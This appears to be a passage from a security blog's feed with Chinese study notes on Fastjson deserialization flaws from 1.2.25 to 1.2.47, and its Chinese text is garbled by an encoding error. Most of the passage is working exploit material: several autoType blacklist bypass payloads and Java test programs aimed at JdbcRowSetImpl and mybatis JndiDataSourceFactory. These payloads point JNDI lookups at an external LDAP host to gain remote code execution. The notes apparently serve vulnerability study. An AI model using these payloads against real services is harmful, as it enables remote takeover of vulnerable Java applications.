class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1225</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:9999/a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼Œç”±äºè¿™é‡Œæ²¡æœ‰é…ç½®æœåŠ¡ç«¯ï¼Œæ‰€ä»¥æ²¡æœ‰ä»»ä½•ååº”</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325202131037.png" alt="image-20240325202131037"></p><p>å¯ä»¥å‘ç°åœ¨è¿™é‡Œcom.sun.rowset.JdbcRowSetImplå‰é¢å¢åŠ äº†ä¸€ä¸ªå­—æ¯L,åé¢å¢åŠ äº†ä¸€ä¸ªåˆ†å·ï¼Œä¸ºä»€ä¹ˆè¿™æ ·å°±å¯ä»¥ç»•è¿‡äº†å‘¢ï¼Œä¸”çœ‹ä¸‹é¢åˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325202454639.png" alt="image-20240325202454639"></p><p>ç”±äºåœ¨å‰é¢å¢åŠ äº†ä¸€ä¸ªå­—æ¯Lï¼Œæ‰€ä»¥å°±å¯ä»¥ç»•è¿‡é»‘ç™½åå•çš„æ£€æµ‹ï¼Œè¿›å…¥åˆ°ä¸Šé¢çš„TypeUtils.loadClassæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è¿›å…¥ç»§ç»­åˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325203738111.png" alt="image-20240325203738111"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325203824483.png" alt="image-20240325203824483"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹å‰é¢çš„Lå’Œåé¢çš„;éƒ½è¿›è¡Œäº†å¤„ç†ï¼Œæœ€åå†æ¬¡è°ƒç”¨loadClassæ–¹æ³•ï¼Œæ˜¯å¯ä»¥ç»•è¿‡çš„</p><h3 id="1-2-42-fj-1-2-43">1.2.42&lt;=fj&lt;1.2.43</h3><p>42ä¹‹åçš„ç‰ˆæœ¬åœ¨æ£€æŸ¥checkAutoTypeä¹‹å‰å¯¹ç±»åè¿›è¡Œäº†æˆªå–å‰åå„ä¸€ä¸ªå­—ç¬¦çš„æ“ä½œï¼Œè¯¦è§ä¸‹é¢å¯¹æ¯”</p><p>æ­¤å›¾ä¸º1.2.47ç‰ˆæœ¬ï¼Œä¸‹é¢é‚£ä¸€ä¸²æ•°å­—æ˜¯å› ä¸º42ç‰ˆæœ¬åå¯¹äºç±»åçš„è¡¨ç¤ºéƒ½å˜æˆäº†å¯¹åº”çš„hashå€¼</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326105123966.png" alt="image-20240326105123966"></p><p>æ­¤å›¾ä¸º1.2.25</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326105231000.png" alt="image-20240326105231000"></p><p>æˆ‘ä»¬å¯ä»¥æ˜æ˜¾å‘ç°åœ¨if (this.autoTypeSupport || expectClass != null) {}ä¹‹å‰å¢åŠ äº†éƒ¨åˆ†ä»£ç ï¼Œå…·ä½“æ•ˆæœå°±æ˜¯æˆªå–ç±»å1åˆ°length-1çš„éƒ¨åˆ†ï¼ˆå»æ‰å‰åå„ä¸€ä¸ªå­—ç¬¦ï¼‰ï¼Œåº”å¯¹æ–¹æ³•ä¹Ÿååˆ†ç®€å•ï¼ŒåŒå†™å³å¯ï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1/hacked&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1242</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fj-1-2-43">fj &lt; 1.2.43</h3><p>æˆ‘ä»¬ç»§ç»­è¿è¡Œä¹‹å‰çš„payloadï¼Œå‘ç°ç›´æ¥æŠ¥é”™äº†ï¼Œä¸‹é¢å°†ä¼šè¿›è¡Œæ–­ç‚¹åˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326111056498.png" alt="image-20240326111056498"></p><p>å‘ç°å¼‚å¸¸éƒ¨åˆ†å¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326111141831.png" alt="image-20240326111141831"></p><p>è¿™æ®µå…¶å®å°±æ˜¯å¯¹Lå¼€å¤´;ç»“å°¾çš„ç±»åè¿›è¡Œäº†wafï¼Œæ‰€ä»¥åé¢çš„ç»•è¿‡å°±ä¸èƒ½ç”¨L&amp;;äº†ï¼Œè·Ÿè¸ªä¸‹é¢çš„TypeUtils.loadClassè¿›è¡Œåˆ†æ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326111523730.png" alt="image-20240326111523730"></p><p>å¯¹äºç±»åçš„ç»•è¿‡ä¸åªæ˜¯L&amp;;ï¼Œ[ä¹Ÿå¯ä»¥è¢«åˆ©ç”¨è¿›è¡Œç»•è¿‡ï¼Œè¡ç”Ÿå‡ºå¦‚ä¸‹payload</p><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1243</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="fj-1-4-45">fj &lt; 1.4.45</h3><p>éœ€è¦æ­é…mybatis3ä½¿ç”¨</p><p><strong>mybatis3 &lt;=3.4.6</strong></p><p>å…·ä½“å…¥å£å¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326115759125.png" alt="image-20240326115759125"></p><p>fjåœ¨å®ä¾‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨å¯¹åº”æˆå‘˜å˜é‡çš„getteræˆ–è€…setteræ–¹æ³•ï¼Œæ‰€ä»¥å°±ä¼šè°ƒç”¨æ­¤å¤„çš„lookupæ–¹æ³•ï¼Œè¿›è€Œè§¦å‘JNDIæ³¨å…¥ï¼Œå¯¹äºjndiè¿˜ä¸ç†Ÿæ‚‰çš„å¸ˆå‚…å»ºè®®ä»1.2.24å¼€å§‹å­¦èµ·ï¼Œjndiå¯ä»¥è¯´æ˜¯è´¯ç©¿å¾ˆå¤šç‰ˆæœ¬çš„fj</p><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1245</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;, \&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;&#125;&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadå¦‚ä¸‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="fj-1-2-47é€šæ€"><strong>fj &lt;= 1.2.47</strong>é€šæ€</h2><p><strong>fj &lt;= 1.2.47</strong>é€šæ€</p><p>æ‰€è°“é€šæ€ï¼Œå°±æ˜¯ä¸ç®¡æ˜¯å¦å¼€å¯AutoTypeéƒ½å¯ä»¥æ‰§è¡Œ</p><p><strong>@typeæ˜¯Classç±»æ—¶ä¼šåŠ è½½valå¯¹åº”çš„ç±»å¹¶å†™å…¥ç¼“å­˜</strong></p><ul><li>å…³é—­äº†autoTypeSupportè‚¯å®šè¿›ä¸å»ç™½åå•æŸ¥æ‰¾ï¼Œåˆç”±äºMappingä¸ºç©ºå°±è¿›å…¥findClass</li><li>å¼€å¯äº†autoTypeSupportåœ¨ç™½åå•ä¹Ÿæ‰¾ä¸åˆ°Classç±»ï¼ˆé»˜è®¤ç™½åå•ä¸ºç©ºï¼‰ï¼Œä¹Ÿä¼šæœ€ç»ˆè¿›å…¥findClass</li></ul><h3 id="å¼€å¯AutoTypeåˆ†æ">å¼€å¯AutoTypeåˆ†æ</h3><p>è¿›å…¥checkAutoTypeï¼Œç”±äºclazzä¸ºç©ºï¼Œæ‰€ä»¥ä¼šè¿›å…¥ä¸‹é¢çš„ç¬¬ä¸€ä¸ªåˆ¤æ–­</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205306719.png" alt="image-20240326205306719"></p><p>ç¬¬ä¸€ä¸ªåˆ¤æ–­å¹¶æ²¡æœ‰è¿”å›clazzï¼Œæ‰€ä»¥ä¼šè¿›å…¥ç¬¬äºŒä¸ªåˆ¤æ–­ï¼Œæˆ‘ä»¬æ–­ç‚¹è·Ÿè¿›</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205549027.png" alt="image-20240326205549027"></p><p>IdentifyHashMapå­˜äº†å¾ˆå¤šåŸºç¡€ç±»ï¼ŒåŒ¹é…åˆ°ç›´æ¥è¿”å›ï¼Œè¿™é‡Œå°±æ˜¯åŒ¹é…åˆ°äº†&quot;java.lang.Class&quot;</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205709132.png" alt="image-20240326205709132"></p><p>è¿”å›ä¸Šå±‚å‡½æ•°ï¼Œå°±å¯ä»¥å‘ç°è¿™é‡Œå°†clazz returnäº†ï¼Œè¿”å›DefaultJSONParser#parseObjectæ–¹æ³•ï¼Œå¹¶è¿›å…¥äº†deserializer.deserialzeæ–¹æ³•</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205817596.png" alt="image-20240326205817596"></p><p>æˆ‘ä»¬ç»§ç»­æ–­ç‚¹è·Ÿè¿›</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213137003.png" alt="image-20240326213137003"></p><p>æ­¤å¤„å¯¹objValè¿›è¡Œäº†èµ‹å€¼ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213326910.png" alt="image-20240326213326910"></p><p>åœ¨266è¡Œå¯¹strValè¿›è¡Œäº†èµ‹å€¼æ“ä½œï¼Œæœ€åæ˜¯é‡å¤´æˆ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213405415.png" alt="image-20240326213405415"></p><p>ç”±äºæ­¤å¤„çš„clazzå¹¶ä¸ä¸ºç©ºï¼Œæ‰€ä»¥æ‰§è¡Œäº†ä¸‹é¢çš„loadClassï¼Œå¯¹äºstrValç±»è¿›è¡Œäº†åŠ è½½ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213655825.png" alt="image-20240326213655825"></p><p>å¯ä»¥å‘ç°loadClasså¼€å¯äº†ç¼“å­˜ï¼Œå¹¶åœ¨1153è¡Œå°†valçš„å€¼å†™å…¥äº†ç¼“å­˜</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213853548.png" alt="image-20240326213853548"></p><p>å½“å†æ¬¡è¿›å…¥checkAutoTypeçš„æ—¶å€™ï¼Œæ­¤æ—¶çš„tyoeNameå°±æ˜¯com.sun.rowset.JdbcRowSetImpl</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326214238747.png" alt="image-20240326214238747"></p><p>åœ¨ç»è¿‡äº†å¯¹äºL&amp;;ã€[çš„æ£€æµ‹ä¹‹åï¼Œè¿›å…¥äº†é»‘åå•åˆ¤æ–­ï¼Œä½†ç»†çœ‹æŠ›å‡ºå¼‚å¸¸çš„æ¡ä»¶ï¼ˆä¸‹é¢ä»£ç ï¼‰ï¼Œæ˜¯ç±»åœ¨é»‘åå•é‡Œä¸”ä¸åœ¨ç¼“å­˜ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ç§æ–¹å¼å°±å¯ä»¥è®©æˆ‘ä»¬çš„æ¶æ„ç±»ç»•è¿‡æ£€æµ‹ï¼ŒæˆåŠŸè¿”å›clazz(839è¡Œ)ï¼Œåé¢å°±å’Œä¸Šé¢çš„æ­¥éª¤ä¸€æ ·äº†</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1247</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸å¼€å¯AutoTypeåˆ†æ">ä¸å¼€å¯AutoTypeåˆ†æ</h3><p>å’Œä¸Šé¢çš„æ­¥éª¤åŸºæœ¬ç›¸åŒ</p><p>ä¸åŒçš„æ˜¯ç¬¬äºŒæ¬¡ï¼Œç”±äºæˆ‘ä»¬å¹¶æ²¡æœ‰å¼€å¯AutoTypeï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ä¸‹é¢çš„ifè¯­å¥</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326215352786.png" alt="image-20240326215352786"></p><p>clazzä¸ºnullï¼Œç›´æ¥è¿›å…¥åˆ°ä¸‹é¢çš„ç¬¬ä¸€ä¸ªæ¡†çš„è¯­å¥é‡Œ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326215417529.png" alt="image-20240326215417529"></p><p>å› ä¸ºä¸Šä¸€æ¬¡å·²ç»å°†com.sun.rowset.JdbcRowSetImplåŠ å…¥äº†æˆ‘ä»¬çš„ç¼“å­˜ï¼Œæ‰€ä»¥getClassFromMappingå°±æ‰¾åˆ°äº†è¯¥ç±»å¹¶å°†å…¶èµ‹å€¼ç»™clazzï¼Œå› æ­¤ï¼Œæ¶æ„ç±»ç»•è¿‡äº†åœ¨ä¸‹é¢çš„!this.autoTypeSupportçš„ifæ£€æµ‹ï¼Œç›´æ¥åœ¨ç¬¬äºŒä¸ªä¸ªæ¡†çš„è¯­å¥é‡Œè¿›è¡Œäº†è¿”å›ï¼Œå†åœ¨åé¢çš„parseObjectä¸­è¿›è¡Œäº†loadClassåŠ è½½ï¼Œå®ç°äº†ä¸å¼€å¯AutoTypeçš„ç»•è¿‡</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1247</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;, \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, &#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;: \&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>FastJson1.2.24</title>
    <link href="https://bowuchuling.github.io/posts/1837oiuj.html"/>
    <id>https://bowuchuling.github.io/posts/1837oiuj.html</id>
    <published>2024-03-28T11:25:12.569Z</published>
    <updated>2024-03-28T11:26:57.690Z</updated>
    
    <content type="html"><![CDATA[<h1>FastJson1.2.24</h1><p>å…ˆæä¸€ä¸‹fastjsonçš„åŠŸèƒ½è¦ç‚¹</p><ul><li><p>ä½¿ç”¨ <code>JSON.parse(jsonString)</code> å’Œ <code>JSON.parseObject(jsonString, Target.class)</code>ï¼Œä¸¤è€…è°ƒç”¨é“¾ä¸€è‡´ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– <code>@type</code> æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„classã€‚</p></li><li><p>fastjson åœ¨åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹æ—¶ä¼šé€šè¿‡åå°„è°ƒç”¨ç±»ä¸­ç¬¦åˆæ¡ä»¶çš„ getter/setter æ–¹æ³•ï¼Œå…¶ä¸­ getter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ã€ä¸æ˜¯é™æ€æ–¹æ³•ã€ä»¥ <code>get</code> å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€æ–¹æ³•ä¸èƒ½æœ‰å‚æ•°ä¼ å…¥ã€ç»§æ‰¿è‡ª <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>ã€æ­¤å±æ€§æ²¡æœ‰ setter æ–¹æ³•ï¼›setter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ï¼Œä»¥ <code>set</code> å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€éé™æ€æ–¹æ³•ã€è¿”å›ç±»å‹ä¸º void æˆ–å½“å‰ç±»ã€å‚æ•°ä¸ªæ•°ä¸º 1 ä¸ªã€‚å…·ä½“é€»è¾‘åœ¨ 